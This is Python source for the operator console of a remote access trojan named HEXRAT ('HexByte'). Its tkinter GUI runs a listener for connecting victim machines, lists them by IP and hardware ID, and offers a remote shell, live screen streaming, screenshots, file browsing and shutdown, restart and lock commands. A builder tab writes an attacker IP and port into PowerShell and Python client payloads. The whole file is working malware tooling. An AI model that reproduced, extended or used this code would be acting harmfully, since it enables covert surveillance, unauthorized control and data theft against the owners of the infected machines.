import socket
import tkinter as tk
from tkinter import ttk
import threading
import customtkinter
import json
import os
import sys
import cv2
from src.hexrat import HEXRAT_Server
import numpy as np
import re
from src.HexFunc import debug
import io
import queue
from PIL import Image, ImageTk
import base64
import time
import ast

# 
class builder:
	def __init__(self, details: dict, file_type):
		self.details = details
		self.file_type = file_type
		print(details)
		self.check()
	def check(self):
		if self.file_type.lower() == "powershell":
			self.build_ps1()
		elif self.file_type.lower() == "python":
			self.build_python()
	def build_ps1(self):
		with open("sources/client.ps1", 'r') as ps_file:
			script = ps_file.read()
			ps_file.close()
		ip = self.details['IP']
		port = self.details['PORT']
		script = script.replace("CLIENT_IP", ip).replace("CLIENT_PORT", port)
		print(script)
		
	def build_python(self):
		debug(self.details)
		with open("sources/client.py", 'r') as py_file:
			script = py_file.read()
			py_file.close()
		ip = self.details['IP']
		port = self.details['PORT']
		script = script.replace("CLIENT_IP", ip).replace("CLIENT_PORT", port)
		print(script)

def is_word_in_quotes(string, word):
    pattern = r'(["\'])(.*?)\1'
    matches = re.findall(pattern, string)
    for match in matches:
        if word in match[1]:
            return True
    return False



class HEXRAT_GUI(HEXRAT_Server):
	def __init__(self, master, ip="0.0.0.0", port=1234) -> None:
		self.ip = ip
		self.port = port
		self.master = master
		self.hexrat = None
		self.hexserver = False
		self.lock = threading.Lock()
		self.master.title("HexByte")
		self.master.geometry("1200x600")
		self.master.resizable(True, True)
		self.create_style()
		self.create_tabs()
		self.create_treeview()
		self.create_buttons()
		self.create_builder()
		self.files = {}
		self.s_out = ""
		
	def quit(self):
		debug("CLOSING WINDOW")
		self.root.destroy()
		try:
			self.stop_server()
		except:
			pass
		sys.exit(1)
	def nothing(*args, **kwargs):
		print(args)

	def mouse_callback(self, *args):
		pass

	def display_screenshot(self, image):
		data = base64.b64decode(image)
		Image.open(io.BytesIO(data)).show()
	def recv_and_exec(self, conn, client_id):
		file_explorer = False
		killstream = False
		remote_active = False
		addr = self.global_vars['address'][int(client_id)]
		monitor_len = self.global_vars['monitors'][client_id]
		address = addr[0] + ":" + str(addr[1])
		while self.global_vars['status']:
			if self.global_vars['stream'][int(client_id)] and not killstream:
				cv2.namedWindow(address, cv2.WINDOW_KEEPRATIO)
				cv2.resizeWindow(address, (960, 540))
				if not remote_active:
					cv2.createTrackbar("Monitor", address, 0, monitor_len, self.nothing)
				remote_active = True
				self.global_vars['stream'][int(client_id)] = False
			if remote_active:
				if cv2.getWindowProperty(address, cv2.WND_PROP_VISIBLE) < 1:
					debug("KILLED", address)
					remote_active = False
					killstream = True
			try:
				monitor = cv2.getTrackbarPos('Monitor', address)
			except:
				pass
			try:
				start_time = time.time()
				shell = self.recvall(conn)
				if shell[0:7] == b"record:":
					if remote_active:
						try:
							data = base64.b64decode(shell[7:])
							image_data = np.frombuffer(data, dtype=np.uint8)
							img = cv2.imdecode(image_data, cv2.IMREAD_COLOR)
							im_rgb = cv2.cvtColor(cv2.cvtColor(img, cv2.COLOR_BGR2RGB), cv2.COLOR_RGB2BGR)
						except:
							self.send(b"record:" + str(monitor).encode('utf-8') + b":" + str(int(quality)).encode('utf-8') + b":-1", conn)
							continue
						cv2.setMouseCallback(address, self.mouse_callback)
						cv2.imshow(address, im_rgb)
						k = str(cv2.waitKey(1))
						if monitor == monitor_len:
							monitor = "ALL"
						quality = (time.time() - start_time) * 100
						if quality <= 30:
							quality = quality*3
						elif quality >= 70:
							quality = quality/10
						self.send(b"record:" + str(monitor).encode('utf-8') + b":" + str(int(quality)).encode('utf-8') + b":" + k.encode('utf-8'), conn)
					else:
						killstream = False
						self.global_vars['stream'][int(client_id)] = False
						cv2.destroyWindow(address)
				elif shell.startswith(b"shell:"):
					self.s_out = shell.split(b"shell:", 1)[1].decode()
				elif shell.startswith(b"FATAL:"):
					error_type = shell.split(b":")[1].decode()
					if error_type == "record":
						self.send(b"record:0:40:-1", conn)
				elif shell == b"recording":
					self.global_vars['stream'][client_id] = True
					self.send(b"record:1:50:-1", conn)
				elif shell.startswith(b"screenshot:"):
					image = shell.split(b"screenshot:", 1)[1]
					threading.Thread(target=self.display_screenshot, args=(image,)).start()
				elif shell.startswith(b"Files->"):
					print("COOOOOOOOOOL")
					self.files = ast.literal_eval(shell.split(b"Files->",1)[1].decode())
					print(self.files)
			except cv2.error as e:
				print(e)
			except ValueError:
				self.send(b"record:" + str(monitor).encode('utf-8') + b":20:-1", conn)
			except Exception as e:
				break
			
	def send_shell_cmd(self, client_id, terminal_window, input_box, root_tk):
		conn = self.global_vars['sock_obj'][int(client_id)]
		try:
			command = input_box.get()
			input_box.configure(state="normal")
			debug(f"Executed {command} On Client ID: {client_id}")
			if "exit" in command:
				root_tk.destroy()
			elif command == "cls" or command == "clear":
				terminal_window.configure(state="normal")
				input_box.delete(0, tk.END)
				terminal_window.delete(1.0, tk.END)
				terminal_window.insert("end", f"")
				terminal_window.delete(0, "end")
				terminal_window.configure(state="disabled")
			elif command:
				self.global_vars["threads"][int(client_id)]
				terminal_window.configure(state="normal")
				debug("Sending data")
				self.send(b"shell:" + command.encode('utf-8'),self.global_vars['sock_obj'][int(client_id)])
				input_box.delete(0, tk.END)
				debug("Deleted history box")
				while True:
					if self.s_out:
						terminal_window.insert(tk.END, self.s_out + '\n')
						terminal_window.see(tk.END)
						terminal_window.configure(state="disabled")
						self.s_out = ""
						break

		except:			
			pass
	def open_terminal_window(self, client_id):
		root_tk = tk.Tk()
		root_tk.title(self.global_vars['address'][int(client_id)])
		frame = tk.Frame(root_tk, bg='grey')
		frame.pack(fill=tk.BOTH, padx=10, pady=10, expand=True)
		terminal_window = tk.Text(frame, height=20, width=80, bg='black', fg='white', insertbackground='white', state="disabled")
		terminal_window.pack(fill=tk.BOTH, expand=True)
		terminal_window.pack_propagate(False)
		input_box = tk.Entry(frame, bg='black', fg='white', insertbackground='white', bd=0, width=30, font=('Arial', 16))
		input_box.pack(pady=10)
		input_box.focus_set()
		input_box.bind('<Return>', lambda event: self.send_shell_cmd(int(client_id), terminal_window, input_box, root_tk))
	
	def screenshot(self, client_id, index):
		conn = self.global_vars['sock_obj'][int(client_id)]
		index = index.split(" ")[1]
		self.send(b"screenshot:" + index.encode('utf-8'), conn)

	def get_brief_info(self, event):
		client_id = self.treeview.identify_row(event.y)
		if client_id:
			view_app = tk.CTkToplevel(self.root)
			view_app.title(f"Overview {self.global_vars['address'][int(client_id)][0]}:{self.global_vars['address'][int(client_id)][1]}")
			view_app.geometry("500x270")

			gather_data = self.send(b"<BRIEF_INFO>", self.global_vars['sock_obj'][int(client_id)])
			print(f"Data Recived: {gather_data}")
	
	def start_server(self):
		self.hexserver = True
		self.hexrat = super()
		self.hexrat.__init__(self.ip, self.port)
		debug("INITIALIZING THREADS")
		run_server = threading.Thread(target=self.hexrat.initialize_server)
		self.global_vars['threads'].append(run_server)
		run_server.start()
	
	def stop_server(self):
		debug(self.global_vars['status'])
		self.global_vars['status'] = False
		debug("ATTEMPTING TO TERMINATE THREADS.")
		for thread in self.global_vars['threads']:
			debug("TERMINATING ->",thread)
			thread.join()
		ids = len(self.global_vars["address"])
		del self.global_vars["sock_obj"][:]
		del self.global_vars["address"][:]
		debug("Clients removed -> {}".format(ids))
		debug("Attempting to terminate tree")
		for i in range(ids):
			try:
				self.treeview.delete(str(i))
				debug("Tree -> {} has been terminatd".format(i))
			except Exception as e:
				debug(e)
		self.socket.close()

	def toggle_label(self, button):
		if button.cget("text") == "Start Server":
			print("RUNNING SERVER")
			try:
				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
					s.connect((self.port, self.port))
					s.close()
			except Exception as e:
				debug(e)
				debug("ATTEMPTING TO START SERVER")
				self.start_server()
				button.configure(text="Stop Server")
		else:
			self.stop_server()
			button.configure(text="Start Server")


	def refresh_clients(self):
		self.stop_server()
		self.start_server()
		
	def create_style(self):
		self.style = ttk.Style(self.master)
		self.style.theme_use("clam")
		self.style.configure("TLabel", foreground="grey", background="#282C34")
		self.style.configure("TButton", foreground="grey", background="#282C34", borderwidth=0)
		self.style.map("TButton", foreground=[('active', 'grey')], background=[('active', '#3E4451')])

		# Configure the style for the buttons
		self.style.configure("TButton", background="#444444", foreground="grey", font=("TkDefaultFont", 10))
		debug("Function create_style has been complete")
	def create_tabs(self):
		self.tabs = ttk.Notebook(self.master)
		s = ttk.Style()
		s.theme_use('default')
		s.configure('TNotebook.Tab', background="#83d0c9", padding=[15,10], tabmargins=[2, 5, 2, 0], highlightthickness=0)
		s.map("TNotebook", background="blue", expand=[("selected", [1, 1, 1, 0])])
		self.tabs.pack(fill="both", expand=True)
		self.tab1 = ttk.Frame(self.tabs)
		self.tab2 = ttk.Frame(self.tabs)
		self.tab3 = ttk.Frame(self.tabs)
		self.tabs.add(self.tab1, text="Clients")
		self.tabs.add(self.tab2, text="Listener")
		self.tabs.add(self.tab3, text="Builder")
		debug("Function create_tabs has been complete")

	def create_treeview(self):
		columns = ("ID", "IP", "PORT", "HWID", "MONITORS")
		self.treeview = ttk.Treeview(self.tab1, columns=columns, show="headings")
		self.treeview.bind("<Button-3>", self.show_context_menu)
		self.treeview.pack(fill="both", expand=True)
		# background is the listbox background item
		self.style.configure("Treeview", background="#83d0c9", fieldbackground="#202020", foreground="black", rowheight=40, height=20, width=4)
		self.style.configure('Treeview.Item', borderwidth=5)
		self.style.map('Treeview', background=[('selected', '#fb5858')])
		for i, column in enumerate(columns):
			if i < len(columns) - 1:
				self.treeview.column(column, anchor="center", stretch=tk.YES)
			else:
				self.treeview.column(column, anchor="center")
			self.treeview.heading(column, text=column)
		self.tab1.columnconfigure(0, weight=1)
		self.tab1.rowconfigure(0, weight=1)
		debug("Function create_treeview has been complete")
	
	def create_builder(self):
		self.HOST_ENTRY = customtkinter.CTkEntry(self.tab3, placeholder_text="127.0.0.1")
		self.HOST_ENTRY.pack(pady=5,padx=5)
		self.PORT_ENTRY = customtkinter.CTkEntry(self.tab3, placeholder_text="1234")
		self.PORT_ENTRY.pack(pady=5,padx=5)
		self.POWERSHELL_BUILD = customtkinter.CTkButton(self.tab3, text="Build Powershell", command=lambda: builder({'IP': self.HOST_ENTRY.get(), 'PORT': self.PORT_ENTRY.get()}, "Powershell"))
		self.POWERSHELL_BUILD.pack(pady=5,padx=5)
		self.PYTHON_BUILD = customtkinter.CTkButton(self.tab3, text="Build Python", command=lambda: builder({'IP': self.HOST_ENTRY.get(), 'PORT': self.PORT_ENTRY.get()}, "Python"))
		self.PYTHON_BUILD.pack(pady=5,padx=5)


	def FileExplore(self, conn):
		window = tk.Toplevel()
		window.title("Listbox Window")
		listbox = tk.Listbox(window)
		listbox.pack()
		self.populate_listbox(conn, listbox)
		listbox.bind("<Double-1>", lambda event: self.on_double_click(event, conn, listbox))

	def on_double_click(self, event, conn, listbox):
		selection = listbox.curselection()
		if selection:
			index = selection[0]
			self.path = self.files[-1]['Extension']
			item = listbox.get(index)
			dictionary = self.files
			self.files = {}
			if index == 0:
				self.update("..", conn)
			elif dictionary[index]['Type'] == "Folder":
				self.update(dictionary[index]['Name'], conn)
			elif  dictionary[index]['Type'] == "File":
				print(dictionary[index]['Name'])
			self.populate_listbox(conn, listbox)
			
	def update(self, content, conn):
		if " " in content:
			content = "'" + content + "'"
		print(b"update:cd " + content.encode('utf-8'))
		self.send(b"update:cd " + content.encode('utf-8'), conn)
		time.sleep(0.1)

	def populate_listbox(self, conn, listbox):
		self.send(b"files",conn)
		while True:
			try:
				if self.files:
					listbox.delete(0, tk.END)
					listbox.insert(tk.END, "..")
					for item in self.files[:-1]:
						listbox.insert(tk.END, item['Name'])
					break
			except Exception as e:
				print(e)
	def create_buttons(self):
		style = ttk.Style()
		buttons_frame = ttk.Frame(self.tab1)
		buttons_frame.pack(side="bottom", pady=10)
		style.configure("my.TButton", background="blue", font=("Arial", 12), foreground="black",fieldbackground="#202020")
		init_server = ttk.Button(buttons_frame, text="Start Server", command=lambda: threading.Thread(target=self.start_server).start(), style="my.TButton")
		init_server.pack(side="left", padx=10)
		init_server.configure(command=lambda: threading.Thread(target=self.toggle_label, args=(init_server,)).start())

		button2 = ttk.Button(buttons_frame, text="Refresh", command=lambda: self.refresh_clients(), style="my.TButton")
		button2.pack(side="right", padx=10)
		# Center the buttons
		buttons_frame.columnconfigure(0, weight=1)
		buttons_frame.columnconfigure(1, weight=1)
		debug("Function create_buttons has been complete")

	def on_submenu_click(self, label):
		debug("The value is {} and the type is {}".format(label, type(label)))

	def surveillance(self, *kwargs):
		row, surveillance_menu, menu = kwargs[0]
		monitor = tk.Menu(menu, tearoff=False)
		menu.add_cascade(label="Surveillance", menu=surveillance_menu)
		surveillance_menu.add_cascade(label="screenshot", menu=monitor)
		for i in range(self.global_vars['monitors'][int(row)]):
			# monitor.add_command(label="monitor " + str(i), command=lambda label="monitor " + str(i): self.on_submenu_click(label))
			monitor.add_command(label="monitor " + str(i), command=lambda label="monitor " + str(i): self.screenshot(int(row), label))
		monitor.add_command(label="screenshot ALL", command=lambda label="screenshot ALL": self.screenshot(int(row), label))
		surveillance_menu.add_command(label="Camera")
		surveillance_menu.add_command(label="screenshare", command=lambda: self.send(b"start_record", self.global_vars['sock_obj'][int(row)]))
		

	def power_options(self, *kwargs):
		row, surveillance_menu, menu = kwargs[0]
		menu.add_cascade(label="Power option", menu=surveillance_menu)
		surveillance_menu.add_command(label="Shutdown", command=lambda: self.send(b"Shutdown", self.global_vars['sock_obj'][row]))
		surveillance_menu.add_command(label="Restart", command= lambda: self.send(b"Restart", self.global_vars['sock_obj'][row]))
		surveillance_menu.add_command(label="Lock", command=lambda: self.send(b"Lock", self.global_vars['sock_obj'][row]))

	def open_file_explorer(self, conn):
		self.send(b"File Explorer", conn)
		print("SENT File Explorer")
		self.FileExplore(conn)

	def show_context_menu(self, event):
		# Get the row that was clicked
		row = self.treeview.identify_row(event.y)
		if row:
			menu = tk.Menu(self.master, tearoff=0)
			surveillance_menu = tk.Menu(menu, tearoff=False)
			power_menu = tk.Menu(menu, tearoff=False)
			menu.add_command(label="Open Shell", command=lambda: self.open_terminal_window(int(row)))
			menu.add_command(label="File Explorer", command=lambda: self.open_file_explorer(self.global_vars['sock_obj'][int(row)]))
			self.surveillance((int(row), surveillance_menu, menu))
			self.power_options((int(row), power_menu, menu))
			menu.tk_popup(event.x_root, event.y_root)

if __name__=="__main__":
	root = customtkinter.CTk()
	app = HEXRAT_GUI(root)
	root.mainloop()
